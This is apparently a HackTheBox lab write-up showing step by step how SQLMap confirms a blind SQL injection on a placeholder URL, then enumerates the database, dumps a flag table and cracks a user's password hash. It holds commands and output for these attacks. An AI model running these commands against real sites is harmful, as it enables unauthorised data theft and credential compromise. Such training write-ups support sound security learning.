# HTB-Writeup-Database-Enumeration
HackTheBox Writeup: Database Enumeration leveraging SQLMap for advanced SQL injection exploitation, schema discovery, and targeted data exfiltration.

By Ramyar Danshgar 


## **Part 1: SQLMap Essentials**

---

### **Step 1: Confirming SQL Injection Vulnerability**

The first step was to confirm whether the target URL (`http://www.example.com/?id=1`) was vulnerable to SQL injection. 

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1"
```

#### **Rationale:**
I used SQLMap to automatically test the `id` parameter for SQLi vulnerabilities by injecting payloads like `id=1 AND 1=1`. SQLMap’s capability to detect and classify SQLi types is crucial because it determines the injection method, such as Boolean-based, UNION-based, or error-based injection.

#### **Output:**
```plaintext
[INFO] the back-end DBMS is MySQL
Parameter: id (GET)
Type: Boolean-based blind
Payload: id=1 AND 1=1
```

SQLMap identified a Boolean-based blind SQLi vulnerability and confirmed that the target DBMS was MySQL. This validated the SQLi entry point, forming the foundation for subsequent enumeration steps.

---

### **Step 2: Retrieving Database Information**

Once I confirmed the vulnerability, I collected metadata about the database environment, including the version, active user, and current database. These details are vital for understanding the scope of access and identifying potential targets.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

#### **Rationale:**
- **`--banner`** provided the database version to identify version-specific vulnerabilities.
- **`--current-user`** revealed whether the user had elevated privileges.
- **`--current-db`** identified the active database for targeted enumeration.
- **`--is-dba`** checked if the user had administrative rights, which could allow broader exploitation.

#### **Output:**
```plaintext
banner: '5.1.41'
current user: 'root@%'
current database: 'testdb'
current user is DBA: True
```

The results showed that the user (`root`) had full administrative privileges (`DBA`) and the database version was MySQL 5.1.41. This elevated access indicated a highly vulnerable environment.

---

### **Step 3: Enumerating Tables**

With the active database identified as `testdb`, I enumerated its table structure to locate data repositories of interest.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

#### **Rationale:**
- **`--tables`** listed all tables in the `testdb` database.
- **`-D testdb`** targeted enumeration specifically to the `testdb` database, avoiding noise from other databases.

#### **Output:**
```plaintext
Database: testdb
[1 table]
+--------+
| flag1  |
+--------+
```

This revealed that `flag1` was the sole table in the database, making it a clear target for data extraction.

---

### **Step 4: Dumping Table Contents**

Having identified the `flag1` table, I extracted its contents to retrieve the flag.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T flag1 -D testdb
```

#### **Rationale:**
- **`--dump`** extracted all rows and columns from the table.
- **`-T flag1`** focused the dump operation on the `flag1` table.
- **`-D testdb`** scoped the query to the `testdb` database.

#### **Output:**
```plaintext
Database: testdb
Table: flag1
[1 entry]
+----+----------------------------------------------+
| id | content                                      |
+----+----------------------------------------------+
| 1  | HTB{c0ngr4t5_y0u_und3rst00d_SQLMap_basics!} |
+----+----------------------------------------------+
```

This confirmed successful exploitation and retrieved the flag: `HTB{c0ngr4t5_y0u_und3rst00d_SQLMap_basics!}`.

---

## **Part 2: Advanced Database Enumeration**

---

### **Step 1: Retrieving Database Schema**

To gain a deeper understanding of the database architecture, I retrieved the schema for all tables and columns.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

#### **Rationale:**
- **`--schema`** provided a complete map of the database architecture, including tables, columns, and their data types.  
This step is essential for identifying potential high-value targets.

#### **Output:**
```plaintext
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+
```

Mapping the schema revealed data relationships and potential sensitive fields, such as `agent` in the `log` table.

---

### **Step 2: Searching for Specific Data**

When dealing with large datasets, I narrowed my focus by searching for specific keywords.

#### **Example: Searching for Tables with "user" in Their Name**
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

#### **Rationale:**
Using **`--search`** helped locate tables containing sensitive data, such as user credentials or personally identifiable information (PII).

#### **Output:**
```plaintext
Database: testdb
[1 table]
+-------+
| users |
+-------+
```

This search identified a `users` table, potentially storing account information.

---

### **Step 3: Extracting Password Hashes**

After identifying a table containing sensitive information, I retrieved its contents and cracked password hashes.

#### **Command:**
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

#### **Rationale:**
SQLMap’s built-in password-decrypting feature simplifies the process of exploiting weak or default passwords. By recognizing and decrypting hashes, SQLMap demonstrates the vulnerability of poor password policies.

#### **Output:**
```plaintext
Recognized possible password hashes in column 'password'
Cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
```

This revealed the plaintext password for the user `Kimberly`.

---

## **Lessons Learned**

1. **Stepwise Workflow:**
   - SQLMap provides a structured approach to SQLi exploitation, starting with vulnerability detection and culminating in targeted data extraction.

2. **Schema Enumeration:**  
   - Understanding the database architecture is critical for efficient and focused enumeration.

3. **Password Decrypting:**  
   - SQLMap’s built-in hash-decrypting reinforced the importance of using strong, unique passwords and enforcing stronger password policies.

